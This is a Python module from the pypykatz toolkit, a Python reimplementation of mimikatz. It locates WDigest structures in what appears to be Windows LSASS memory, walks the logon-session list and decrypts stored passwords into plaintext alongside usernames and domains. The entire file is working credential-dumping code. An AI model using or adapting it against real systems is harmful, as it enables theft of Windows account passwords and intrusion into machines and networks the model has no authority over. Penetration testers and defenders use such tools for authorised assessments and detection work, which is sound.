#!/usr/bin/env python3
#
# Author:
#  Tamas Jos (@skelsec)
#
import io
import logging

from pypykatz.lsadecryptor.package_commons import *

class WdigestCredential:
	def __init__(self):
		self.credtype = 'wdigest'
		self.username = None
		self.domainname = None
		self.password = None
		self.luid = None
	
	def to_dict(self):
		t = {}
		t['credtype'] = self.credtype
		t['username'] = self.username
		t['domainname'] = self.domainname
		t['password'] = self.password
		t['luid'] = self.luid
		return t
	def to_json(self):
		return json.dumps(self.to_dict())
		
	def __str__(self):
		t = '\t== WDIGEST [%x]==\n' % self.luid
		t += '\t\tusername %s\n' % self.username
		t += '\t\tdomainname %s\n' % self.domainname
		t += '\t\tpassword %s\n' % self.password
		return t
		
class WdigestDecryptor(PackageDecryptor):
	def __init__(self, reader, decryptor_template, lsa_decryptor):
		super().__init__('Wdigest')
		self.reader = reader
		self.decryptor_template = decryptor_template
		self.lsa_decryptor = lsa_decryptor
		self.credentials = []
		
	def find_signature(self):
		logging.log(1, '[WdigestDecryptor] Searching for key struct signature')
		fl = self.reader.find_in_module('wdigest.dll',self.decryptor_template.signature)
		if len(fl) == 0:
			raise Exception('[WdigestDecryptor] Signature was not found! %s' % self.decryptor_template.signature.hex())
		return fl[0]

	def find_first_entry(self):
		position = self.find_signature()
		ptr_entry_loc = self.reader.get_ptr_with_offset(position + self.decryptor_template.first_entry_offset)
		ptr_entry = self.reader.get_ptr(ptr_entry_loc)
		return ptr_entry, ptr_entry_loc
		
	def add_entry(self, wdigest_entry):
		wc = WdigestCredential()
		wc.luid = wdigest_entry.luid
		wc.username = wdigest_entry.UserName.read_string(self.reader)
		wc.domainname = wdigest_entry.DomainName.read_string(self.reader)
		wc.encrypted_password = wdigest_entry.Password.read_data(self.reader)
		
		if len(wc.encrypted_password) % 8 == 0:
			t = self.lsa_decryptor.decrypt(wc.encrypted_password)
			if t and len(t) > 0:
				try:
					wc.password = t.decode('utf-16-le')
				except:
					wc.password = t.hex()
		else:
			wc.password = wc.encrypted_password # special case for (unusable/plaintext?) orphaned credentials
		
		self.credentials.append(wc)
	
	def start(self):
		try:
			entry_ptr_value, entry_ptr_loc = self.find_first_entry()
		except Exception as e:
			logging.log(1,'Failed to find Wdigest structs! Reason: %s' % e)
			return
		self.reader.move(entry_ptr_loc)
		entry_ptr = self.decryptor_template.list_entry(self.reader)
		self.walk_list(entry_ptr, self.add_entry)